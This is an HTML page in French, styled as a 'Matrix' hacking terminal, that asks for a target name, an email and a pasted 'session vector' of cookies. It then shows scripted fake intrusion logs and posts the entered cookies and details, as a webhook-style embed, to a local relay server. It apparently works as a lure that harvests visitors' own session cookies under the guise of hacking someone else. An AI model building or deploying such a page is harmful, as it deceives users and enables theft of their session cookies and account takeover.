<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>MATRIX TERMINAL | Cyber-Lab</title>
    <style>
        :root { --neon: #00ff41; --dark: #020202; }
        
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; overflow: hidden; }
        
        /* Canvas pour la pluie Matrix */
        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: 1; opacity: 0.15; }

        /* Effet de balayage CRT */
        .scanline { width: 100%; height: 100px; z-index: 10; background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(0, 255, 65, 0.1) 50%, rgba(0, 0, 0, 0) 100%); opacity: 0.1; position: fixed; bottom: 100%; animation: scan 6s linear infinite; pointer-events: none; }
        @keyframes scan { from { bottom: 100%; } to { bottom: -100%; } }

        .container { 
            position: relative; z-index: 5; max-width: 550px; width: 90%; 
            border: 1px solid var(--neon); padding: 30px; margin: 50px auto;
            background: rgba(0, 15, 0, 0.9); box-shadow: 0 0 20px var(--neon);
        }

        h1 { text-align: center; letter-spacing: 10px; border-bottom: 2px solid var(--neon); padding-bottom: 10px; font-size: 1.5rem; text-shadow: 0 0 8px var(--neon); }

        input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--neon); color: var(--neon); width: 100%; padding: 12px; margin: 10px 0; box-sizing: border-box; outline: none; font-family: 'Courier New'; }
        
        .btn { background: var(--neon); color: black; border: none; padding: 15px; cursor: pointer; font-weight: bold; width: 100%; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
        .btn:hover { background: white; box-shadow: 0 0 30px var(--neon); }
        .btn-panic { background: #ff3131; color: white; font-size: 0.7rem; padding: 5px; margin-top: 20px; }

        #loading-zone, #final-success { display: none; text-align: center; }
        .log-box { text-align: left; font-size: 0.8rem; height: 150px; overflow: hidden; border: 1px solid #004400; padding: 10px; margin: 15px 0; background: black; }
        .progress { font-size: 1.2rem; margin: 10px 0; color: white; }
    </style>
</head>
<body>

<canvas id="matrix-canvas"></canvas>
<div class="scanline"></div>

<div class="container">
    <h1>SYSTEM CORE 3.0</h1>

    <div id="user-view">
        <p style="font-size: 0.8rem;">[STATUS: CONNECTED TO PROXY_LOCAL:3000]</p>
        <input type="text" id="username" placeholder="IDENTIFIANT CIBLE">
        <input type="email" id="userEmail" placeholder="EMAIL DE RÉCEPTION">
        <textarea id="cookieInput" rows="4" placeholder="VECTEUR DE SESSION..."></textarea>
        <button class="btn" onclick="startHack()">EXÉCUTER L'INFILTRATION</button>
        <button class="btn-panic" onclick="location.reload()">[PANIC BUTTON: ABORT ALL]</button>
    </div>

    <div id="loading-zone">
        <div id="status-header" style="font-weight:bold;">INITIALISATION...</div>
        <div class="log-box" id="log-container"></div>
        <div class="progress" id="bar-text">[░░░░░░░░░░░░] 0%</div>
    </div>

    <div id="final-success">
        <h2 style="color:white;">EXTRACTION RÉUSSIE</h2>
        <div style="border: 1px dashed var(--neon); padding: 15px; margin: 20px 0;">
            <p>Destinataire : <span id="target-email" style="color:white;"></span></p>
            <p style="font-size: 0.8rem;">Logs envoyés au serveur Webhook.</p>
        </div>
        <button class="btn" onclick="downloadReport()">TÉLÉCHARGER LE RAPPORT .TXT</button>
        <button class="btn" style="background:none; color:var(--neon); border:1px solid var(--neon); margin-top:10px;" onclick="location.reload()">RESET TERMINAL</button>
    </div>
</div>

<script>
    // --- EFFET MATRIX ---
    const canvas = document.getElementById('matrix-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()*&^%";
    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function drawMatrix() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0F0";
        ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(drawMatrix, 50);

    // --- LOGIQUE DU SITE ---
    let session = {};

    function playBeep(f, d) {
        const a = new (window.AudioContext || window.webkitAudioContext)();
        const o = a.createOscillator();
        const g = a.createGain();
        o.type = 'sine'; o.frequency.value = f; g.gain.value = 0.03;
        o.connect(g); g.connect(a.destination); o.start();
        setTimeout(() => o.stop(), d);
    }

    function startHack() {
        session.u = document.getElementById('username').value;
        session.e = document.getElementById('userEmail').value;
        session.c = document.getElementById('cookieInput').value;

        if(!session.u || !session.e) return alert("ERREUR: PARAMÈTRES MANQUANTS");

        playBeep(300, 100);
        document.getElementById('user-view').style.display = 'none';
        document.getElementById('loading-zone').style.display = 'block';

        const logs = [
            "Scanning IP: " + (Math.floor(Math.random() * 255) + ".168.1.42"),
            "Port 443 detected... Opening SSL tunnel",
            "Bypassing Firewall: 100% complete",
            "Injecting payload into session headers...",
            "Capturing cookies for: " + session.u,
            "Encrypting data packets (AES-256)...",
            "Sending to remote webhook server...",
            "Clearing system logs... Done."
        ];

        let i = 0;
        const interval = setInterval(() => {
            if(i < logs.length) {
                const l = document.createElement('div');
                l.innerText = "> " + logs[i];
                document.getElementById('log-container').appendChild(l);
                const pct = Math.floor(((i + 1) / logs.length) * 100);
                document.getElementById('bar-text').innerText = `[${"█".repeat(Math.floor(i*1.5))}${"░".repeat(12-Math.floor(i*1.5))}] ${pct}%`;
                playBeep(400 + (i * 40), 50);
                i++;
            } else {
                clearInterval(interval);
                finish();
            }
        }, 700);
    }

    function finish() {
        playBeep(800, 300);
        document.getElementById('loading-zone').style.display = 'none';
        document.getElementById('final-success').style.display = 'block';
        document.getElementById('target-email').innerText = session.e;

        // Envoi au serveur Node
        fetch("http://localhost:3000/send-data", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "💀 MATRIX EXTRACTION COMPLETE 💀",
                    color: 65280,
                    fields: [
                        { name: "Utilisateur", value: session.u, inline: true },
                        { name: "Email", value: session.e, inline: true },
                        { name: "Cookies", value: "```" + (session.c || "N/A") + "```" }
                    ]
                }]
            })
        }).catch(() => {});
    }

    window.downloadReport = function() {
        const text = `--- MATRIX SYSTEM LOG ---\nTarget: ${session.u}\nEmail: ${session.e}\nCookies: ${session.c}\nStatus: EXTRACTION SUCCESSFUL`;
        const blob = new Blob([text], { type: 'text/plain' });
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = `LOG_${session.u}.txt`;
        a.click();
    };
</script>

</body>
</html>
